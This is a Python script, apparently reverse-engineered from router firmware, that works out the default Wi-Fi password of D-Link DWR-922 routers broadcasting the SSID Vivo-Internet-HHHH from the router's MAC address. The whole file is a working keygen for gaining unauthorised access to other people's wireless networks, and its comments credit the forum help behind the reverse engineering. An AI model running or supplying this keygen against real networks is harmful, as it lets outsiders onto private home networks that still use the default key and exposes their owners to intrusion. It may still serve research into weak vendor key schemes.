# much thanks to Selenium on hashkiller forums for implementing the commander binary into an emulator
# without it would not have been possible to debug this and extract the keygen
# this is mode 4 and 12 from the lte3301 /usr/sbin/commander binary
# used on at least the D-Link DWR-922 with SSID Vivo-Internet-HHHH from Anatel

import hashlib
import argparse

def dwr_922(mac):

	mac_byte_strings = []
	for i in range(0, 12, 2):
		mac_byte_strings.append(mac[i:i+2].upper())

	mac_byte_values = []
	for i in mac_byte_strings:
		mac_byte_values.append(int(i, 16))

	oui_value = mac_byte_values[0]
	for i in range(1, 3):
		oui_value = oui_value * 1024
		oui_value = oui_value + mac_byte_values[i]

	nic_value = mac_byte_values[3]
	for i in range(4, 6):
		nic_value = nic_value * 1024
		nic_value = nic_value + mac_byte_values[i]

	total_value = oui_value + nic_value + 1234567890
	digit_values = list(map(int,str(total_value)))
	
	digit_sum = 0
	for i in range(0, 10, 2):
		digit_sum = digit_sum + 3 * digit_values[i] + digit_values[i+1]
	
	digit_mod = digit_sum % 10
	digit_mod_sum = digit_values[1] + (10-digit_mod)
	digit_values[1] = digit_mod_sum % 10

	decimal_password = ''
	for i in range(0, 10):
		decimal_password += str(digit_values[i])
	
	password = hex(int(decimal_password))[2:].upper()

	print(password)

parser = argparse.ArgumentParser(description='D-Link DWR-922 with SSID Vivo-Internet-HHHH from Anatel Keygen')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

dwr_922(args.mac)